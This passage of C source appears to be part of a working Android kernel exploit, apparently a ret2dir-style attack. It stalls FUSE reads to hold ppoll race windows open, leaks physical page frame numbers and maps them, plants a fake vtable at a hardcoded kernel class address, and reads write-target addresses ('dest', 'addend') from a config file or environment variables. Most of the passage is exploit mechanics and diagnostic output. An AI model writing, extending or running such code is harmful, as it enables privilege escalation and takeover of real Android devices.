  printf("[r2d] releasing FUSE stall\n");
  wr_file("/data/local/tmp/fusestall.release", "1\n");

  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  unlink("/data/local/tmp/fusestall.arm");
  if (g_ppoll_area) {
    munmap(g_ppoll_area, g_ppoll_map_len);
    g_ppoll_area = NULL;
    g_ppoll_pf = NULL;
  }
  __atomic_store_n(&g_watch, 0, __ATOMIC_SEQ_CST);
  pthread_join(watch, NULL);
  pthread_join(cwatch, NULL);

  wr_sys(TR "/tracing_on", "0\n");
  dump_pi_trace();
  wr_sys(TR "/events/sched/sched_pi_setprio/enable", "0\n");
  wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");

  dump_page("final");
  printf("[r2d] tids owner=%d waiter=%d consumer=%d\n",
         g_owner_tid, g_waiter_tid, g_consumer_tid);
  printf("[r2d] summary depth=%s stall=%d ppoll=%ld/%d consumer=%ld/%d "
         "ppoll_ms=%.3f cons_ms=%.3f lock=0x%lx peak_wlock=0x%x peak_rb=0x%llx peak_left=0x%llx\n",
         g_depth_name ? g_depth_name : "?", stall_held, g_ppoll_ret, g_ppoll_errno, g_consumer_ret,
         g_consumer_errno, ns_delta(&g_ppoll_t0, &g_ppoll_t1) / 1e6,
         ns_delta(&g_cons_t0, &g_cons_t1) / 1e6, g_lock_q,
         g_peak_wlock, (unsigned long long)g_peak_rb, (unsigned long long)g_peak_left);
}

static int read_boot_id(char *dst, size_t n) {
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  ssize_t r;
  if (fd < 0) return -1;
  r = read(fd, dst, n - 1);
  close(fd);
  if (r <= 0) return -1;
  dst[r] = 0;
  while (r > 0 && (dst[r - 1] == '\n' || dst[r - 1] == '\r' || dst[r - 1] == ' '))
    dst[--r] = 0;
  return 0;
}

int main(void) {
  char boot[80];
  setvbuf(stdout, NULL, _IONBF, 0);
  page_sz = (size_t)sysconf(_SC_PAGESIZE);
  if (read_boot_id(boot, sizeof(boot)) == 0) {
    g_use_live_fair = (strcmp(boot, LIVE_BOOT_ID) == 0);
    printf("[r2d] boot_id=%s live_expect=%s use_live_fair=%d\n",
           boot, LIVE_BOOT_ID, g_use_live_fair);
  } else {
    boot[0] = 0;
    g_use_live_fair = 0;
    printf("[r2d] boot_id unreadable, recapture path\n");
  }
  if (g_use_live_fair)
    printf("[r2d] 8.27 LIVE fair=0x%llx (DEAD-825=0xffffffd6d4e10ab8 never plant)\n",
           (unsigned long long)LIVE_FAIR_CLASS);
  else
    printf("[r2d] 8.27 recapture: plant mapped-zero vtable, do not use stale slide\n");
  printf("[r2d] pid=%d uid=%d page=%zu first_bytes=%d lock_only=%d\n",
         getpid(), getuid(), page_sz, g_first_bytes, g_lock_only);
  g_watch_fp = fopen("/data/local/tmp/e1c6_ret2dir_watch.log", "w");
  if (g_watch_fp) setvbuf(g_watch_fp, NULL, _IONBF, 0);
  g_sclass_fd = open("/data/local/tmp/e1c6_sclass.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (g_sclass_fd >= 0) {
    char z = 0;
    write(g_sclass_fd, &z, 1);
    fsync(g_sclass_fd);
  }

  {
    FILE *cf = fopen("/data/local/tmp/r2d.conf", "r");
    char line[256];
    const char *e;
    if (cf) {
      while (fgets(line, sizeof(line), cf)) {
        char *k = line, *v;
        while (*k == ' ' || *k == '\t') k++;
        if (*k == '#' || *k == '\n' || *k == 0) continue;
        v = strchr(k, '=');
        if (!v) continue;
        *v++ = 0;
        while (*v == ' ' || *v == '\t') v++;
        {
          char *t = v + strlen(v);
          while (t > v && (t[-1] == '\n' || t[-1] == '\r' || t[-1] == ' '))
            *--t = 0;
        }
        if (!strcmp(k, "dest") || !strcmp(k, "DEST"))
          g_wt_dest_override = strtoull(v, 0, 0);
        else if (!strcmp(k, "addend") || !strcmp(k, "ADDEND"))
          g_wt_addend = strtoull(v, 0, 0);
        else if (!strcmp(k, "kdata") || !strcmp(k, "KDATA"))
          g_wt_kdata = atoi(v);
      }
      fclose(cf);
    }
    e = getenv("R2D_DEST");
    if (e && e[0]) g_wt_dest_override = strtoull(e, 0, 0);
    e = getenv("R2D_ADDEND");
    if (e && e[0]) g_wt_addend = strtoull(e, 0, 0);
    e = getenv("R2D_KDATA");
    if (e && e[0]) g_wt_kdata = atoi(e);
    printf("[r2d] conf dest=0x%llx addend=0x%llx kdata=%d\n",
           (unsigned long long)g_wt_dest_override,
           (unsigned long long)g_wt_addend, g_wt_kdata);
  }
  if (start_listen_proxy() != 0) return 1;
  /* Accept FUSE fd first: Java sendFd closes 500ms after write. Leak now
     sleeps 200ms and must not occupy that window. */
  g_proxy_fd = recv_proxy_fd();
  if (g_proxy_fd < 0) return 1;
  if (leak_pfn_and_map() != 0) return 1;
  /* 8.17: leftover-preserve + nfds=14 kstack-depth nudge (tsp/sigmask).
     t0 stamped on main. Waiter fire has zero syscalls before ppoll. */
  sigemptyset(&g_ppoll_sigset);
  g_ppoll_ts.tv_sec = 0;
  g_ppoll_ts.tv_nsec = 0;
  g_stall_page = STALL_PAGE;
  {
    struct {
      const char *name;
      int use_tsp;
      int use_sig;
    } vars[] = {
      {"timeout_tsp0_sigNULL", 1, 0},
    };
    unsigned int tag = 0xF;
    for (unsigned int vi = 0; vi < sizeof(vars) / sizeof(vars[0]); vi++) {
      g_depth_name = vars[vi].name;
      g_ppoll_tsp = vars[vi].use_tsp ? &g_ppoll_ts : NULL;
      g_ppoll_sigmask = vars[vi].use_sig ? &g_ppoll_sigset : NULL;
      apply_overlay_tag(tag);
      snapshot_page();
      dump_page_raw("pre-window");
      dump_mem_raw("pre-task", g_page_task);
      dump_mem_raw("pre-rq", g_page_rq);
      g_peak_wlock = 0;
      g_peak_rb = 0;
      g_peak_left = 0;
      g_saw_change = 0;
      test_window();
      printf("[r2d] depth=%s tag=0x%x result peak_wlock=0x%x peak_rb=0x%llx peak_left=0x%llx saw=%d\n",
             g_depth_name, tag, g_peak_wlock, (unsigned long long)g_peak_rb,
             (unsigned long long)g_peak_left, g_saw_change);
      dump_page("after-depth");
      if (g_peak_wlock || g_saw_change) {
        printf("[r2d] HIT depth=%s leftover-preserve lock_only=%d\n",
               g_depth_name, g_lock_only);
        dump_page_raw("hit");
        dump_mem_raw("hit-task", g_page_task);
        dump_mem_raw("hit-rq", g_page_rq);
        break;
      }
    }
  }
  wr_file("/data/local/tmp/fusestall.quit", "1\n");
  dump_page("before-exit");
  printf("[r2d] done\n");
  if (g_watch_fp) fclose(g_watch_fp);
  return 0;
}
